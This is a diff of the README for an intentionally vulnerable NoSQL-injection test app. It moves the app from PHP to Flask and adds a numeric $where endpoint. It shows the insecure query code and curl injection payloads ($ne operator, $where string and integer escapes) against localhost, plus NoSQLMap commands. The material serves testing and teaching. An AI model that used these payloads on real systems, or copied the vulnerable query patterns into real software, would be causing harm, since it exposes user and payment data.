@@ -1,9 +1,9 @@
 # NoSQL Injection Vulnerable App
 
 A small, intentionally-vulnerable web app for demonstrating and testing
-**NoSQL injection**. It is a three-service Docker Compose stack (Apache + PHP +
-MongoDB) with three endpoints, each vulnerable to a different NoSQL injection
-technique. It is the target used by NoSQLMap's functional tests.
+**NoSQL injection**. It is a two-service Docker Compose stack (Flask + MongoDB)
+with four endpoints, each vulnerable to a different NoSQL injection technique.
+It is the target used by NoSQLMap's functional tests.
 
 > ⚠️ **This app is deliberately insecure.** Do not expose it to untrusted
 > networks. The MongoDB credentials (`root` / `prisma`) are hardcoded and the
@@ -13,12 +13,11 @@ technique. It is the target used by NoSQLMap's functional tests.
 
 | Service | Build          | Purpose                                                        |
 |---------|----------------|----------------------------------------------------------------|
-| apache  | `./docker/apache` | Serves the app on **http://localhost:8080** (container :80)  |
-| php     | `./docker/php`    | PHP-FPM backend that talks to MongoDB                          |
-| mongo   | `./docker/mongo`  | MongoDB (`root`/`prisma`), exposed on **27017**               |
+| app     | `./docker/app`   | Flask app serving the endpoints on **http://localhost:8080**  |
+| mongo   | `./docker/mongo` | MongoDB (`root`/`prisma`), exposed on **27017**               |
 
-The app source lives in `src/` and is bind-mounted into both the apache and php
-containers, so edits to `src/*.php` take effect on the next request (no rebuild
+The app source lives in `src/app.py` and is bind-mounted into the `app`
+container, so edits to `src/app.py` take effect on the next request (no rebuild
 needed).
 
 ## Quick start
@@ -58,51 +57,52 @@ username `adrien`, order ID `42`.
 
 Base URL: `http://localhost:8080`
 
-### 1. Account lookup — operator injection (`acct.php`)
+### 1. Account lookup — operator injection (`/acct`)
 
 Looks up a payment record by customer ID. The input is used directly as the
 value of a Mongo filter field, with no type or shape validation:
 
-```php
-$filter = ['id' => $_GET['acctid']];
+```python
+filter = {"id": parsed.get("account_id")}
 ```
 
 **Baseline** (one record):
 
 ```bash
-curl -sG 'http://localhost:8080/acct.php' --data-urlencode 'acctid=42'
+curl -sG 'http://localhost:8080/acct' --data-urlencode 'account_id=42'
 ```
 
 **Injection** (dump all cards) — supply a Mongo operator instead of a value:
 
 ```bash
-curl -sG 'http://localhost:8080/acct.php' --data-urlencode 'acctid[$ne]='
+curl -sG 'http://localhost:8080/acct' --data-urlencode 'account_id[$ne]='
 ```
 
 This turns the filter into `{"id": {"$ne": ""}}`, which matches every document.
+The other BSON operators (`$gt`, `$regex`, `$exists`) work the same way.
 
-### 2. User lookup — `$where` injection (`userdata.php`)
+### 2. User lookup — `$where` string-escape injection (`/userdata`)
 
-Searches users by username using a `$where` clause. The input is interpolated
-straight into the JavaScript:
+Searches users by name using a `$where` clause. The input is interpolated
+straight into the JavaScript (quoted context):
 
-```php
-$js = "function () { var query = '". $search . "'; return this.username == query;}";
+```python
+js = f"function () {{ var query = '{name}'; return this.username == query;}}"
 ```
 
 **Baseline**:
 
 ```bash
-curl -sG 'http://localhost:8080/userdata.php' --data-urlencode 'usersearch=adrien'
+curl -sG 'http://localhost:8080/userdata' --data-urlencode 'name=adrien'
 ```
 
 **Injection** (dump all users) — break out of the string and force `true`:
 
 ```bash
-curl -sG 'http://localhost:8080/userdata.php' --data-urlencode "usersearch=' ; return true; '"
+curl -sG 'http://localhost:8080/userdata' --data-urlencode "name=' ; return true; '"
 ```
 
-### 3. Order lookup — `$where` injection (`orderdata.php`)
+### 3. Order lookup — `$where` string-escape injection (`/orderdata`)
 
 Same `$where` technique as the user lookup, but against `shop.orders` and the
 `id` field.
@@ -110,22 +110,46 @@ Same `$where` technique as the user lookup, but against `shop.orders` and the
 **Baseline**:
 
 ```bash
-curl -sG 'http://localhost:8080/orderdata.php' --data-urlencode 'ordersearch=42'
+curl -sG 'http://localhost:8080/orderdata' --data-urlencode 'order=42'
 ```
 
 **Injection** (dump all orders):
 
 ```bash
-curl -sG 'http://localhost:8080/orderdata.php' --data-urlencode "ordersearch=' ; return true; '"
+curl -sG 'http://localhost:8080/orderdata' --data-urlencode "order=' ; return true; '"
 ```
 
-> The `$where` payload (`' ; return true; '`) can also be pasted directly into a
-> browser address bar; the browser URL-encodes it for you.
+### 4. Numeric order lookup — `$where` integer-escape injection (`/numericdata`)
+
+Same as the order lookup, but the input is embedded in an **unquoted numeric
+context** inside the `$where` function:
+
+```python
+js = f"function () {{ var query = {order}; return this.id == query;}}"
+```
+
+**Baseline**:
+
+```bash
+curl -sG 'http://localhost:8080/numericdata' --data-urlencode 'order=42'
+```
+
+**Injection** (dump all orders) — inject JS directly (no quote break-out needed):
+
+```bash
+curl -sG 'http://localhost:8080/numericdata' --data-urlencode 'order=1; return true;'
+```
+
+This endpoint also supports **timing-based injection**: a sleep-loop payload
+delays the response by several seconds (the `$where` function runs per document).
+
+> The `$where` payloads can also be pasted directly into a browser address bar;
+> the browser URL-encodes them for you.
 
 ## Using NoSQLMap against this app
 
 With the stack running (`docker compose up -d --build`), you can point the
-NoSQLMap CLI at it. All three endpoints are `GET`, so the relevant mode is
+NoSQLMap CLI at it. All four endpoints are `GET`, so the relevant mode is
 **NoSQL Web App attacks** (`--attack 2`).
 
 > Install first: `pip install -e .` (provides the `nosqlmap` console script), or
@@ -140,7 +164,7 @@ parameter.
 
 ```bash
 nosqlmap --attack 2 --victim localhost --webPort 8080 \
-    --uri '/acct.php?acctid=42' --params 1 \
+    --uri '/acct?account_id=42' --params 1 \
     --injectSize 8 --injectFormat 3 --verb ON
 ```
 
@@ -148,7 +172,7 @@ nosqlmap --attack 2 --victim localhost --webPort 8080 \
 
 ```bash
 nosqlmap --attack 2 --victim localhost --webPort 8080 \
-    --uri '/userdata.php?usersearch=adrien' --params 1 \
+    --uri '/userdata?name=adrien' --params 1 \
     --injectSize 8 --injectFormat 1 --verb ON
 ```
 
@@ -156,7 +180,15 @@ nosqlmap --attack 2 --victim localhost --webPort 8080 \
 
 ```bash
 nosqlmap --attack 2 --victim localhost --webPort 8080 \
-    --uri '/orderdata.php?ordersearch=42' --params 1 \
+    --uri '/orderdata?order=42' --params 1 \
+    --injectSize 8 --injectFormat 3 --verb ON
+```
+
+### Numeric order lookup (`$where` integer-escape injection)
+
+```bash
+nosqlmap --attack 2 --victim localhost --webPort 8080 \
+    --uri '/numericdata?order=42' --params 1 \
     --injectSize 8 --injectFormat 3 --verb ON
 ```
 
@@ -170,7 +202,7 @@ vulnerable / possibly-vulnerable URLs to a file.
 | `--attack 2`     | NoSQL Web App attacks                                                                             |
 | `--victim`       | Target host/IP (e.g. `localhost`)                                                                |
 | `--webPort`      | Target web port (e.g. `8080`)                                                                    |
-| `--uri`          | App path **including** the query string, e.g. `/acct.php?acctid=42`                             |
+| `--uri`          | App path **including** the query string, e.g. `/acct?account_id=42`                             |
 | `--params`       | 1-based index(es) of the query parameter(s) to inject, comma-separated (e.g. `1`)               |
 | `--injectSize`   | Length of the random baseline string                                                             |
 | `--injectFormat` | Baseline string format: `1`=alphanumeric, `2`=letters, `3`=numbers, `4`=email                   |
